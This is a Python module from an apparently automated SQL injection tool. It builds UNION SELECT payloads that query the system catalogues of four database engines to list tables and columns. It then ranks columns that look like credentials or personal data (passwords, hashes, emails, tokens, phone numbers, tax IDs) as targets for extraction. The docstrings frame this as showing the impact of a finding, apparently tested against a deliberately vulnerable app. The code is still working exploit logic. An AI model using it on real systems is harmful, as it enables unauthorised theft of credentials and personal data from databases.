"""Discover a database schema *through* a proven injection instead of guessing it.

Measured: a single query joining every table to its columns
(``sqlite_master JOIN pragma_table_info``) does execute - the target answered with
``Users|email;Users|password;...`` - but that string is far longer than the 2048-character
response excerpt, so the value was cut and the parse found nothing while the injection had
plainly worked. The listing is therefore asked in two cheap steps: the table names, then
the columns of one table per request. Short values survive the excerpt.

Measured defect this closes: the extraction capability carried a literal table list
(``('email', 'Users', 'user_email'), ('password', 'Users', 'password_hash')``). The column
count was measured against the target, but the table and column names were the ones a
Juice Shop deployment happens to use, so against any other target the impact step could
not work at all - and it read as "no impact" rather than "wrong names".

A schema listing is exactly the same mechanical question as a column count: concatenate
the catalogue query into the string slot the response layer already exposes, then split
it. Nothing here is target-specific; the catalogue names are the database engine's own,
and they are tried in order until one answers.
"""
from __future__ import annotations

import re

# One concatenated string per engine, newest-first by likelihood on a JSON API target.
# Each returns one row per object as "table|column", which needs no schema knowledge to
# parse and survives the excerpt cap because it is a single short value.
CATALOGUE_QUERIES = (
    {
        'dialect': 'sqlite',
        'tables_query': ("SELECT group_concat(name, ';') FROM sqlite_master "
                         "WHERE type='table'"),
        'columns_query': ("SELECT group_concat(name, ';') FROM pragma_table_info('{table}')"),
        'separator': ';',
    },
    {
        'dialect': 'mysql',
        'tables_query': ("SELECT group_concat(table_name, ';') FROM information_schema.tables "
                         "WHERE table_schema=database()"),
        'columns_query': ("SELECT group_concat(column_name, ';') FROM information_schema.columns "
                          "WHERE table_schema=database() AND table_name='{table}'"),
        'separator': ';',
    },
    {
        'dialect': 'postgres',
        'tables_query': ("SELECT string_agg(table_name, ';') FROM information_schema.tables "
                         "WHERE table_schema='public'"),
        'columns_query': ("SELECT string_agg(column_name, ';') FROM information_schema.columns "
                          "WHERE table_schema='public' AND table_name='{table}'"),
        'separator': ';',
    },
    {
        'dialect': 'mssql',
        'tables_query': "SELECT STRING_AGG(table_name, ';') FROM information_schema.tables",
        'columns_query': ("SELECT STRING_AGG(column_name, ';') FROM information_schema.columns "
                          "WHERE table_name='{table}'"),
        'separator': ';',
    },
)

# How many tables to ask about. A schema listing is one request per table, so a bound is
# part of the design: the identity tables are asked first because they carry the impact.
MAX_TABLES = 12

# A credential column is recognised by what its name says, not by a fixed list of names.
_CREDENTIAL_HINTS = (
    ('password_hash', r'(?i)pass(word|wd|phrase)?|hash|secret|digest'),
    ('user_email', r'(?i)mail'),
    ('user_name', r'(?i)(^|_)(user_?name|login|username)($|_)'),
    ('api_token', r'(?i)(api_?key|token|secret_?key)'),
    ('personal_data', r'(?i)(phone|mobile|address|birth|ssn|tax|national)'),
)

# A table whose name suggests it holds identities is tried before a product catalogue.
_IDENTITY_TABLE = re.compile(r'(?i)(user|account|member|customer|person|staff|admin|login)')


def parse_catalogue(value, separator=';'):
    """Turn "table|column;table|column" into {table: [columns]}.

    Also accepts a bare "table;table" listing, which is what the MySQL/Postgres branch
    returns before the per-table column query runs.
    """
    tables = {}
    for chunk in str(value or '').split(separator):
        chunk = chunk.strip()
        if not chunk:
            continue
        if '|' in chunk:
            table, _, column = chunk.partition('|')
        else:
            table, column = chunk, ''
        table = table.strip()
        column = column.strip()
        if not table:
            continue
        tables.setdefault(table, [])
        if column and column not in tables[table]:
            tables[table].append(column)
    return tables


def rank_credential_columns(tables):
    """Choose what to extract, from the discovered schema rather than a literal.

    Returns a list of ``(expression, table, label)`` in impact order: the pair that shows
    authenticated-data exposure first, then weaker corroboration. Raises the value of the
    finding from "a version string" to "a credential", which is the difference between a
    class match and demonstrated impact.
    """
    chosen = []
    for table in sorted(tables, key=lambda name: (0 if _IDENTITY_TABLE.search(name) else 1, name.lower())):
        columns = tables.get(table) or []
        for label, pattern in _CREDENTIAL_HINTS:
            match = re.search(pattern, ' '.join(columns))
            if not match:
                continue
            # The regex finds which *class* is present; pick the concrete column by the
            # same pattern so the expression is a real identifier, never a guess.
            column = next((c for c in columns if re.search(pattern, c)), None)
            if not column:
                continue
            if any(row[2] == label for row in chosen):
                continue
            chosen.append((column, table, label))
    return chosen


def catalogue_expression(discovery, query):
    """Wrap a catalogue query as the single string slot the extraction already supports.

    The query goes into the SQL verbatim: its own string literals (``'|'``, ``';'``) are
    part of the statement. Escaping them here would corrupt the subquery.
    """
    return (discovery['opener'] + ' UNION SELECT '
            + ','.join([str(i) for i in range(1, discovery.get('columns') or 1)]
                       + ["(%s)" % query])
            + '--')
